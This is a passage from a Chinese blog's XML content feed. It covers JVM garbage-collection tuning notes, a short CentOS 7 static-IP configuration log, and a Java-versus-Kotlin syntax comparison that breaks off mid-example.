<li>死亡对象回收零代价</li>
<li>大部分对象用过即死（朝生夕死）</li>
<li>Minor GC 所用时间远远小于 Full GC</li>
</ul>
<p>新生代内存越大越好么？答案：不是！</p>
<ul>
<li>新生代内存太小：频繁触发Minor GC，会STW，会使得吞吐量下降</li>
<li>新生代内存太大：老年代内存占比有所降低，会更频繁地触发Full GC。而且触发Minor GC时，清理新生代所花费的时间会更长</li>
</ul>
<p>新生代调优： </p>
<ul>
<li>Oracle建议新生代内存占<strong>堆大小</strong>的 25% ~ 50% ，<code>-Xmn</code> 参数设置新生代大小。</li>
<li>老师推荐：容纳所有【并发量 * ( 请求 - 响应 ) 】的数据为宜</li>
</ul>
<p>幸存区调优：</p>
<ul>
<li>幸存区大到能够保留【当前活跃对象 + 需要晋升的对象】 </li>
<li>晋升阈值配置得当，让长时间存活的对象尽快晋升</li>
</ul>
<h4 id="5-5-老年代调优"><a href="#5-5-老年代调优" class="headerlink" title="5.5 老年代调优"></a>5.5 老年代调优</h4><p>以CMS为例：</p>
<ul>
<li>CMS的老年代内存越大越好</li>
<li>先尝试不用调优，如果没有FullGC则不需要调优，有FullGC也先调优新生代</li>
<li>观察FullGC时老年代内存占用，调大老年代预设值 1/4 ~ 1/3 </li>
</ul>
<h4 id="5-6-案例分析"><a href="#5-6-案例分析" class="headerlink" title="5.6 案例分析"></a>5.6 案例分析</h4><p>还是看视频吧</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7配置IPV4静态网络</title>
    <url>/Linux/CentOS7%E9%85%8D%E7%BD%AEIPV4%E9%9D%99%E6%80%81%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<p>在VM虚拟机中NAT网络转为桥接，客户机CentOS则要改为静态IP，下面是操作日志。</p>
<p>ens33是默认的网卡，我们就修改这个网卡。<br>修改内容</p>
<ol>
<li>设置一个静态IP、网关</li>
<li>启动IPV4，关闭IPV6</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 图形编辑</span></span><br><span class="line">$ nmtui edit ens33</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等同于编辑文件</span></span><br><span class="line">$ vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line"></span><br><span class="line">$ service network restart</span><br></pre></td></tr></table></figure>
<p><img src="/images/linux/centos7.png" alt="nmtui edit ens33"></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>from-java-to-kotlin</title>
    <url>/Kotlin/from-java-to-kotlin/</url>
    <content><![CDATA[<p>根据 <a href="https://github.com/MindorksOpenSource/from-java-to-kotlin" target="_blank" rel="noopener">from-java-to-kotlin</a> 的学习笔记</p>
<h2 id="null声明"><a href="#null声明" class="headerlink" title="null声明"></a>null声明</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String otherName;</span><br><span class="line">otherName = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> otherName : String?</span><br><span class="line">otherName = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="空判断"><a href="#空判断" class="headerlink" title="空判断"></a>空判断</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (text != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> length = text.length();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">text?.let &#123;</span><br><span class="line">    <span class="keyword">val</span> length = text.length</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// or simply</span></span><br><span class="line"><span class="keyword">val</span> length = text?.length</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span>[] int_data = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100</span>];</span><br><span class="line">String[] data_str = <span class="keyword">new</span> String[<span class="number">100</span>];</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> <span class="keyword">data</span> = ByteArray(<span class="number">200</span>)</span><br><span class="line"><span class="keyword">val</span> int_data = IntArray(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">val</span> data_str = arrayOfNulls&lt;String&gt;(<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String firstName = <span class="string">"Amit"</span>;</span><br><span class="line">String lastName = <span class="string">"Shekhar"</span>;</span><br><span class="line">String message = <span class="string">"My name is: "</span> + firstName + <span class="string">" "</span> + lastName;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> firstName = <span class="string">"Amit"</span></span><br><span class="line"><span class="keyword">val</span> lastName = <span class="string">"Shekhar"</span></span><br><span class="line"><span class="keyword">val</span> message = <span class="string">"My name is: <span class="variable">$firstName</span> <span class="variable">$lastName</span>"</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String text = <span class="string">"First Line\n"</span> +</span><br><span class="line">              <span class="string">"Second Line\n"</span> +</span><br><span class="line">              <span class="string">"Third Line"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> text = <span class="string">"""</span></span><br><span class="line"><span class="string">        |First Line</span></span><br><span class="line"><span class="string">        |Second Line</span></span><br><span class="line"><span class="string">        |Third Line</span></span><br><span class="line"><span class="string">        """</span>.trimMargin()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String text = x &gt; <span class="number">5</span> ? <span class="string">"x &gt; 5"</span> : <span class="string">"x &lt;= 5"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> text = <span class="keyword">if</span> (x &gt; <span class="number">5</span>)</span><br><span class="line">              <span class="string">"x &gt; 5"</span></span><br><span class="line">           <span class="keyword">else</span> <span class="string">"x &lt;= 5"</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><ul>
<li>java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> andResult  = a &amp; b;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> orResult   = a | b;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> xorResult  = a ^ b;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> rightShift = a &gt;&gt; <span class="number">2</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> leftShift  = a &lt;&lt; <span class="number">2</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> unsignedRightShift = a &gt;&gt;&gt; <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> andResult  = a and b</span><br><span class="line"><span class="keyword">val</span> orResult   = a or b</span><br><span class="line"><span class="keyword">val</span> xorResult  = a xor b</span><br><span class="line"><span class="keyword">val</span> rightShift = a shr <span class="number">2</span></span><br><span class="line"><span class="keyword">val</span> leftShift  = a shl <span class="number">2</span></span><br><span class="line"><span class="keyword">val</span> unsignedRightShift = a ushr <span class="number">2</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="类型判断和转换-声明式"><a href="#类型判断和转换-声明式" class="headerlink" title="类型判断和转换 (声明式)"></a>类型判断和转换 (声明式)</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (object <span class="keyword">instanceof</span> Car) &#123;</span><br><span class="line">&#125;</span><br><span class="line">Car car = (Car) object;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">object</span> <span class="keyword">is</span> Car) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> car = <span class="keyword">object</span> <span class="keyword">as</span> Car</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="类型判断和转换-隐式"><a href="#类型判断和转换-隐式" class="headerlink" title="类型判断和转换 (隐式)"></a>类型判断和转换 (隐式)</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (object <span class="keyword">instanceof</span> Car) &#123;</span><br><span class="line">   Car car = (Car) object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">object</span> <span class="keyword">is</span> Car) &#123;</span><br><span class="line">   <span class="keyword">var</span> car = <span class="keyword">object</span> <span class="comment">// 聪明的转换</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="多重条件"><a href="#多重条件" class="headerlink" title="多重条件"></a>多重条件</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">0</span> &amp;&amp; score &lt;= <span class="number">300</span>) &#123; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (score <span class="keyword">in</span> <span class="number">0</span>..<span class="number">300</span>) &#123; &#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="更灵活的case语句"><a href="#更灵活的case语句" class="headerlink" title="更灵活的case语句"></a>更灵活的case语句</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> score = <span class="comment">// some score;</span></span><br><span class="line">String grade;</span><br><span class="line"><span class="keyword">switch</span> (score) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        grade = <span class="string">"Excellent"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        grade = <span class="string">"Good"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        grade = <span class="string">"OK"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        grade = <span class="string">"Fail"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        grade = <span class="string">"Fail"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> score = <span class="comment">// some score</span></span><br><span class="line"><span class="keyword">var</span> grade = <span class="keyword">when</span> (score) &#123;</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span> -&gt; <span class="string">"Excellent"</span></span><br><span class="line">    <span class="keyword">in</span> <span class="number">6</span>..<span class="number">8</span> -&gt; <span class="string">"Good"</span></span><br><span class="line">    <span class="number">4</span>, <span class="number">5</span> -&gt; <span class="string">"OK"</span></span><br><span class="line">    <span class="keyword">in</span> <span class="number">1</span>..<span class="number">3</span> -&gt; <span class="string">"Fail"</span></span><br><span class="line">    <span class="keyword">else</span> -&gt; <span class="string">"Fail"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span> ; i++) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span> ; i++) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">10</span>; i &gt;= <span class="number">0</span> ; i--) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span> ; i+=<span class="number">2</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">10</span>; i &gt;= <span class="number">0</span> ; i-=<span class="number">2</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (String item : collection) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry: map.entrySet()) &#123; &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">1</span> until <span class="number">10</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">10</span> downTo <span class="number">0</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10</span> step <span class="number">2</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">10</span> downTo <span class="number">0</span> step <span class="number">2</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (item <span class="keyword">in</span> collection) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((key, value) <span class="keyword">in</span> map) &#123; &#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="更方便的集合操作"><a href="#更方便的集合操作" class="headerlink" title="更方便的集合操作"></a>更方便的集合操作</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> List&lt;Integer&gt; listOfNumber = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map&lt;Integer, String&gt; keyValue = <span class="keyword">new</span> HashMap&lt;Integer, String&gt;();</span><br><span class="line">map.put(<span class="number">1</span>, <span class="string">"Amit"</span>);</span><br><span class="line">map.put(<span class="number">2</span>, <span class="string">"Ali"</span>);</span><br><span class="line">map.put(<span class="number">3</span>, <span class="string">"Mindorks"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Java 9</span></span><br><span class="line"><span class="keyword">final</span> List&lt;Integer&gt; listOfNumber = List.of(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map&lt;Integer, String&gt; keyValue = Map.of(<span class="number">1</span>, <span class="string">"Amit"</span>,</span><br><span class="line">                                             <span class="number">2</span>, <span class="string">"Ali"</span>,</span><br><span class="line">                                             <span class="number">3</span>, <span class="string">"Mindorks"</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> listOfNumber = listOf(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">val</span> keyValue = mapOf(<span class="number">1</span> to <span class="string">"Amit"</span>,</span><br><span class="line">                     <span class="number">2</span> to <span class="string">"Ali"</span>,</span><br><span class="line">                     <span class="number">3</span> to <span class="string">"Mindorks"</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Java 7 and below</span></span><br><span class="line"><span class="keyword">for</span> (Car car : cars) &#123;</span><br><span class="line">  System.out.println(car.speed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Java 8+</span></span><br><span class="line">cars.forEach(car -&gt; System.out.println(car.speed));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Java 7 and below</span></span><br><span class="line"><span class="keyword">for</span> (Car car : cars) &#123;</span><br><span class="line">  <span class="keyword">if</span> (car.speed &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    System.out.println(car.speed);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Java 8+</span></span><br><span class="line">cars.stream().filter(car -&gt; car.speed &gt; <span class="number">100</span>).forEach(car -&gt; System.out.println(car.speed));</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">cars.forEach &#123;</span><br><span class="line">    println(it.speed)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cars.filter &#123; it.speed &gt; <span class="number">100</span> &#125;</span><br><span class="line">      .forEach &#123; println(it.speed)&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="comment">// logic here</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doSomething</span><span class="params">(<span class="keyword">int</span>... numbers)</span> </span>&#123;</span><br><span class="line">   <span class="comment">// logic here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">doSomething</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">// logic here</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">doSomething</span><span class="params">(<span class="keyword">vararg</span> numbers: <span class="type">Int</span>)</span></span> &#123;</span><br><span class="line">   <span class="comment">// logic here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="带返回值的方法"><a href="#带返回值的方法" class="headerlink" title="带返回值的方法"></a>带返回值的方法</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="comment">// logic here</span></span><br><span class="line">   <span class="keyword">return</span> score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getScore</span><span class="params">()</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">   <span class="comment">// logic here</span></span><br><span class="line">   <span class="keyword">return</span> score</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// as a single-expression function</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getScore</span><span class="params">()</span></span>: <span class="built_in">Int</span> = score</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="无结束符号"><a href="#无结束符号" class="headerlink" title="无结束符号"></a>无结束符号</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getScore</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// logic here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getScore</span><span class="params">(value: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">   <span class="comment">// logic here</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">2</span> * value</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// as a single-expression function</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getScore</span><span class="params">(value: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> = <span class="number">2</span> * value</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="constructor-构造器"><a href="#constructor-构造器" class="headerlink" title="constructor 构造器"></a>constructor 构造器</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Utils</span><span class="params">()</span> </span>&#123; </span><br><span class="line">      <span class="comment">// This utility class is not publicly instantiable </span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Utils</span> <span class="keyword">private</span> <span class="keyword">constructor</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">getScore</span><span class="params">(value: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * value</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// another way</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span> Utils &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getScore</span><span class="params">(value: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * value</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Persion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> : <span class="type">Persion</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Persion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Persion()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> : <span class="type">Persion &#123;</span></span></span><br><span class="line">	<span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onName</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span> : Persion &#123;</span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onName</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Get-Set-构造器"><a href="#Get-Set-构造器" class="headerlink" title="Get Set 构造器"></a>Get Set 构造器</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Developer</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        Developer developer = (Developer) o;</span><br><span 